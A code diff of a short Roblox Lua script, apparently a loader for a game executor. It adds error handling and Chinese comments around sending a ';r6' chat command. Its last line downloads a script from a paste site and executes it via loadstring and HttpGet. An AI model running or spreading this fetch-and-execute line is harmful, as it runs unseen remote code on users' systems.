@@ -1,9 +1,20 @@
 local TextChatService = game:GetService("TextChatService")
 
 task.wait(0.5)
-local channel = TextChatService.TextChannels.RBXGeneral
+
+local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
 if channel then
-	channel:SendAsync(";r6")
+    local success, err = pcall(function()
+        channel:SendAsync(";r6")
+    end)
+
+    if success then
+        -- 等一会，确保消息已经发出
+        task.wait(0.3)
+    else
+        warn("说话失败:", err)
+    end
 end
 
+-- 再执行后面的脚本
 loadstring(game:HttpGet("https://pastefy.app/aGPGIrjN/raw"))()
